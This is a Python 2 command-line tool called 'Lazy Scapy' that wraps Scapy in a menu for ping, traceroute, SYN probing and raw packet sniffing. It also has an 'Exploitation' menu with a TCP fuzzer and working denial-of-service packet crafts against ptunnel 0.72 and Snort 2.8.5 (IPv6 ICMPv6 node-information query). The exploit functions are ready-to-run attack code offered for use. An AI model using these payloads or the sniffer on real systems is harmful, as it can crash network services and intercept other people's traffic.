# -*- coding: utf-8 -*-
from scapy.all import *
import time

def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prBold(skk): print("\033[1m {}\033[0m" .format(skk))



menu_ascii_art = """
██╗      █████╗ ███████╗██╗   ██╗    ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
██║     ███████║  ███╔╝  ╚████╔╝     ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
██║     ██╔══██║ ███╔╝    ╚██╔╝      ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
███████╗██║  ██║███████╗   ██║       ███████║╚██████╗██║  ██║██║        ██║   
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝
"""

def print_menu():       
    prGreen(menu_ascii_art) 
    prCyan("----------Networking-----------")
    prBold("n0) Help")
    prBold("n1) Ping function")
    prBold("n2) Traceroute")
    prBold("n3) Your Computers Networking Information")
    prBold("n4) SYN Scan")
    prBold("n5) Sniff raw TCP/IP data")
    prRed("----------Exploitation----------")
    prBold("e0) Help")
    prBold("e1) TCP Fuzz")
    prBold("e2) ptunnel 0.72 DOS") 
    prBold("e3) Snort 2.8.5 DOS")


loop=True


########################################## Network
def ping():
    ip = raw_input('Input IP to ping >>> ')
    print '\n IP you are pining >>> ' + ip
    send(IP(dst=ip)/ICMP())

def trace():
    domain = raw_input('Input an domain name you want to traceroute with extra steps >>>')
    print '\n Domain you are tracerouting >>> ' + domain
    traceroute([domain],maxttl=20)

def net():
    print("Your Interfaces: ")
    print(get_if_list())
    print("Your Routes: ")
    print(conf.route)
    print("Your IP: ")
    print(get_if_addr(conf.iface))
    print("Your MAC: ")
    print(get_if_hwaddr(conf.iface))

def syn():
    ip = raw_input('IP >>> ')
    port = input('Port >>> ')
    port = int(port)
    sr1(IP(dst=ip)/TCP(dport=port,flags="S"))

def raw():
    sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))

########################################## Exploit
def fuzzer():
    host_ip=get_if_addr(conf.iface)
    target_ip= raw_input("IP >>> ")
    target_port= raw_input("Port >>> ")
    target_port= int(target_port)
    mysocket=socket.socket()
    mysocket.connect((target_ip,target_port))
    mystream=StreamSocket(mysocket)
    ascapypacket=IP(dst=target_ip)/TCP(dport=target_port)/fuzz(Raw())
    mystream.send(ascapypacket)
    time.sleep(2)
    mystream.send(ascapypacket)

def ptun_DOS():
    conf.verbose = 0
    remote_host = raw_input("IP >>>")
    magic='\xd5\x20\x08\x80'
    dst_ip='AAAA'
    dst_port='BBBB'
    state='CCCC'  
    ack='\x00\x00\xff\xff'
    data_len='\x00\x00\x00\x00'
    seq_id='DDDD'
    pkt = IP(dst=remote_host)/ICMP()/Raw(magic)/Raw(dst_ip)/Raw(dst_port)/Raw(state)/Raw(ack)/Raw(data_len)/Raw(seq_id)
    send(pkt)

def snort_dos():
    ipv6= raw_input("IPv6 address >>> ")
    z = "Q" * 30
    send(IPv6(dst=ipv6,nh=1)/ICMPv6NIQueryNOOP(type=4)/z) 











while loop:          
    print_menu()    
    choice = raw_input(">>> ")

    if choice=="n1":
        print "1 has been selected"
        ping()
    elif choice=="n0":
        print """
Lazy Scapy (lscapy.py) is a script that makes it in a  very lazy and easy way, though command line menus and simple prompts and inputs for the user, networking functionality of scapy, such as pinging, getting web requests, crafting packets, and certain exploits and POC's 

        """
    elif choice=="n2":
        trace()
    elif choice=="n3":
        net()
    elif choice=="n4":
        syn()
    elif choice=="n5":
        raw()
        #loop=False 
    elif choice=="e0":
        print """
        PLACE HOLDER TEXT
        """
    elif choice=="e1":
        fuzzer()
    elif choice=="e2":
        ptun_DOS()
    elif choice=="e3":
        snort_dos()
    else:
        raw_input("Wrong option selection. Enter any key to try again..")
